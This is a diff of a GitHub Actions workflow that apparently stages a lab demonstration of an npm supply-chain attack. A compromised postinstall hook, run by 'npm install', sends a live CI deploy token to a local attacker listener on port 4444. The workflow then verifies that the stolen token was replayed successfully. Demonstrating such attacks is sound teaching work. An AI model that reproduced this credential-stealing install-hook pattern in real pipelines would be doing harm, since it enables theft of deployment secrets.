@@ -1,22 +1,93 @@
 name: npm-build
 on: [push, workflow_dispatch]
 
+# Least-privilege token: the job only needs to read the checked-out code.
+permissions:
+  contents: read
+
 jobs:
   build:
-    runs-on: host-mac
-    env:
-      CI_DEPLOY_TOKEN: ${{ secrets.CI_DEPLOY_TOKEN }}
-      LAB_HOST: "10.37.129.50"
-      LAB_PORT: "4444"
+    # GitHub-hosted clean VM. Free + unlimited on a public repo.
+    # The entire attack chain runs inside this VM — nothing leaves it, and no
+    # real-world credential is ever involved. The "credential" is a live but
+    # lab-only JWT minted by deploy-api, valid for 15 minutes, signed with a
+    # secret generated at container start that exists only in this job.
+    runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
 
-      - name: Install dependencies
-        working-directory: victim-app
-        run: |
-          npm install
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
 
-      - name: App runs fine
-        working-directory: victim-app
+      # Both lab services resolve `deploy-api` by name (same as docker-compose),
+      # so the real listener.py / entrypoint logic run here unmodified.
+      - name: Map lab hostname -> localhost
+        run: echo "127.0.0.1 deploy-api" | sudo tee -a /etc/hosts
+
+      - name: Start deploy-api (real HS256 token service)
         run: |
-          node -e "console.log('app output: build complete')"
+          python deploy-api/app.py &
+          echo "DEPLOY_API_PID=$!" >> "$GITHUB_ENV"
+          # wait for health
+          for i in $(seq 1 15); do
+            curl -sf http://deploy-api:9000/health >/dev/null && break
+            sleep 1
+          done
+          curl -s http://deploy-api:9000/health && echo
+
+      - name: Start attacker collector + replay (listener.py)
+        run: |
+          python attacker/listener.py > "$GITHUB_WORKSPACE/attacker.log" 2>&1 &
+          echo "ATTACKER_PID=$!" >> "$GITHUB_ENV"
+          sleep 1
+
+      - name: CI fetches a live deploy credential (the way a real pipeline does)
+        run: |
+          # Stand-in for the OIDC / secrets-store handoff at build start.
+          TOK="$(curl -s http://deploy-api:9000/token | python -c 'import sys,json; print(json.load(sys.stdin)["token"])')"
+          # Deliberately NOT masked: the token is lab-only, 15-min TTL, and valid
+          # only against a deploy-api that ceases to exist when this job ends.
+          # Showing it leak is the whole point of the writeup.
+          echo "CI_DEPLOY_TOKEN=$TOK" >> "$GITHUB_ENV"
+          echo "[ci] CI_DEPLOY_TOKEN is set (a live, signed deploy JWT)."
+
+      - name: Install dependencies (triggers the compromised postinstall)
+        working-directory: victim-app
+        env:
+          # The package's beacon targets the attacker collector on localhost.
+          LAB_HOST: "127.0.0.1"
+          LAB_PORT: "4444"
+          # CI_DEPLOY_TOKEN is already in the job env from the step above.
+        run: |
+          npm install     # <-- postinstall hook fires here, before any app code
+          sleep 3          # give the collector time to receive + replay
+
+      - name: Show the attack result (beacon capture + stolen-token replay)
+        run: |
+          echo '==================== ATTACKER COLLECTOR LOG ===================='
+          cat "$GITHUB_WORKSPACE/attacker.log" || echo '(no attacker log)'
+          echo '================================================================'
+          # Fail the job if the stolen credential was NOT accepted — i.e. assert
+          # the attack actually worked, so a green check means proof of impact.
+          grep -q "Stolen credential accepted" "$GITHUB_WORKSPACE/attacker.log" \
+            && echo "PROOF: stolen live token was accepted by deploy-api (HTTP 200)." \
+            || { echo "attack did not complete as expected"; exit 1; }
+
+      - name: Upload attack log
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: attacker-log
+          path: attacker.log
+          if-no-files-found: warn
+
+      - name: App runs fine (victim notices nothing)
+        working-directory: victim-app
+        run: node -e "console.log('app output: build complete')"
+
+      - name: Tear down lab services
+        if: always()
+        run: |
+          kill "$DEPLOY_API_PID" "$ATTACKER_PID" 2>/dev/null || true
